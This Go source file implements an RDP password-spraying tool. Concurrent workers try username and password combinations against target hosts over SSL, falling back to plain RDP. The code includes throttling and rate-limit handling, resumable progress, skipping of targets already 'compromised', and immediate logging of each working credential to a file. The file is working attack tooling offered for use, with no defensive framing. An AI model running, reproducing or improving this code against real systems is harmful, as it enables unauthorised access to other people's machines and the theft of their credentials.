// rdpspray.go - Optimized for speed, reliability, and proper connection management

package main

import (
	"sync"
	"sync/atomic"
	"time"
	"github.com/whiterabb17/strongarm/grdp"
	"github.com/whiterabb17/strongarm/grdp/glog"
)

// safe wraps a function with panic recovery
func safe(fn func()) {
	defer func() {
		if r := recover(); r != nil {
			atomic.AddInt64(&stats.errors, 1)
			globalMonitor.RecordFailure()
		}
	}()
	fn()
}

// rdpSpray performs RDP password spraying with optimized concurrency
func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32, successfulTargets *sync.Map, shutdown <-chan struct{}) {
	defer wg.Done()

	// Pre-parse all targets once for efficiency
	targetCache := make(map[string]targetStruct, len(job.targetsRaw))
	for _, rawTarget := range job.targetsRaw {
		if _, exists := targetCache[rawTarget]; !exists {
			parsed := parseTarget(rawTarget)
			if parsed.port == 0 {
				parsed.port = 3389
			}
			targetCache[rawTarget] = parsed
		}
	}

	// Batch progress saves to reduce I/O overhead with monotonic counter
	var progressBatch int64 // Use int64 for atomic operations across goroutines
	const progressSaveBatch = 50

	// Semaphore for per-worker concurrency control
	sem := make(chan struct{}, CONCURRENT_PER_WORKER)
	var workerWg sync.WaitGroup

	// Counter for tracking attempt progress (for resume functionality)
	// Use monotonic counter that survives restarts properly
	var attemptCounter int32

	// Track skipped targets for logging
	var skippedCount int32

	for _, rawTarget := range job.targetsRaw {
		// Check shutdown signal with drain handling
		select {
		case <-shutdown:
			workerWg.Wait() // Drain remaining goroutines
			return
		default:
		}

		// Check if this target already has a successful credential
		if val, ok := successfulTargets.Load(rawTarget); ok && atomic.LoadInt32(val.(*int32)) == 1 {
			atomic.AddInt32(&skippedCount, 1)
			if verbose {
				logVerbose("Skipping target %s (already compromised)", rawTarget)
			}
			continue
		}

		target := targetCache[rawTarget]
		targetStr := stringifyTarget(target)

		for _, password := range job.passwords {
			// Check shutdown signal with drain handling
			select {
			case <-shutdown:
				workerWg.Wait() // Drain remaining goroutines
				return
			default:
			}

			// Check if target was compromised during this run
			if val, ok := successfulTargets.Load(rawTarget); ok && atomic.LoadInt32(val.(*int32)) == 1 {
				break
			}

			for _, username := range job.usernames {
				// Check shutdown signal with drain handling
				select {
				case <-shutdown:
					workerWg.Wait() // Drain remaining goroutines
					return
				default:
				}

				// Check if target was compromised during this run
				if val, ok := successfulTargets.Load(rawTarget); ok && atomic.LoadInt32(val.(*int32)) == 1 {
					break
				}

				// Track this attempt number (always increment for consistent counting)
				currentAttempt := atomic.AddInt32(&attemptCounter, 1)

				// Skip already processed attempts (for resume functionality)
				savedProgress := atomic.LoadInt32(progress)
				if currentAttempt <= savedProgress {
					continue
				}

				// Check throttling inside goroutine to catch in-flight connections
				var throttleDelay time.Duration
				if globalMonitor.ShouldThrottle() {
					throttleDelay = globalMonitor.GetThrottleDelay()
				}

				// Check global rate limit before spawning
				var rateLimitDelay time.Duration
				if globalMonitor.ShouldApplyGlobalRateLimit() {
					rateLimitDelay = globalMonitor.GetGlobalRateLimitDelay()
				}

				// Acquire semaphore slot
				sem <- struct{}{}
				workerWg.Add(1)

				go func(user, pass, targetStr string, attemptNum int32, tDelay time.Duration, rDelay time.Duration) {
					defer func() {
						<-sem
						workerWg.Done()
					}()

					// Apply pre-computed delays before spawning sub-goroutine
					if tDelay > 0 {
						time.Sleep(tDelay)
					}
					if rDelay > 0 {
						time.Sleep(rDelay)
					}

					// Check shutdown signal again (double-check pattern for safety)
					select {
					case <-shutdown:
						return
					default:
					}

					// Track active connection
					globalMonitor.IncrementActive()
					defer globalMonitor.DecrementActive()

					// Create client with timeout context
					client := grdp.NewClient(targetStr, glog.NONE)

					var isHit bool

					// Login with timeout - use sync.Once to ensure single execution
					var once sync.Once
					var loginErr error

					once.Do(func() {
						safe(func() {
							loginErr = client.LoginForSSL(".", user, pass)
							if loginErr != nil {
								// Try RDP protocol as fallback
								loginErr = client.LoginForRDP(".", user, pass)
							}

							if loginErr == nil {
								isHit = true
							} else {
								atomic.AddInt64(&stats.errors, 1)
								globalMonitor.RecordFailure()
							}
						})
					})

					// Wait for login with timeout using select on the done channel
					select {
					case <-time.After(15 * time.Second):
						// Timeout - mark as failure
						if loginErr == nil && !isHit {
							atomic.AddInt64(&stats.errors, 1)
							globalMonitor.RecordFailure()
							if verbose {
								logVerbose("Login timeout for %s@%s", user, targetStr)
							}
						}
					case <-time.After(15 * time.Second + 100*time.Millisecond):
						// Extra grace period - login already completed
					}

					// ALWAYS close client to prevent connection leaks
					client.Close()

					// Small delay to let OS release ephemeral port
					// This prevents port exhaustion under high concurrency
					time.Sleep(10 * time.Millisecond)

					// Send hit to channel - BLOCKING to ensure no hits are lost
					// This is critical: we MUST wait for the channel to accept the hit
					if isHit {
						// Mark target as compromised BEFORE sending to channel
						var targetFlag int32 = 1
						successfulTargets.Store(targetStr, &targetFlag)

						// Write immediately to file with fsync (critical for crash recovery)
						successLine := targetStr + ":" + user + ":" + pass + "\n"
						written := writeCredentialsImmediately(successLine)

						// Only process if not a duplicate
						if written {
							// Record success AFTER deduplication (accurate monitoring)
							globalMonitor.RecordSuccess()

							select {
							case results <- targetStr + ":" + user + ":" + pass:
							case <-shutdown:
								return
							}
						}
					}

					// Update progress counter atomically after completion using double-checked locking
					for {
						currentProgress := atomic.LoadInt32(progress)
						if attemptNum <= currentProgress {
							break
						}
						if atomic.CompareAndSwapInt32(progress, currentProgress, attemptNum) {
							break
						}
					}

					// Batch progress saves with monotonic counter reset
					batchCount := atomic.AddInt64(&progressBatch, 1)
					if batchCount >= progressSaveBatch {
						atomic.StoreInt64(&progressBatch, 0)
						saveProgressAsync()
					}
				}(username, password, targetStr, currentAttempt, throttleDelay, rateLimitDelay)

				// Minimal delay to prevent connection spikes
				time.Sleep(time.Millisecond)
			}
		}
	}

	// Wait for all in-flight attempts to complete
	workerWg.Wait()

	// Final progress save if needed
	if progressBatch > 0 {
		saveProgress()
	}

	if verbose && skippedCount > 0 {
		logVerbose("Worker completed: skipped %d already-compromised targets", skippedCount)
	}
}

// saveProgressAsync saves progress without blocking the worker
func saveProgressAsync() {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				// Ignore save errors, don't crash the spray
			}
		}()
		saveProgress()
	}()
}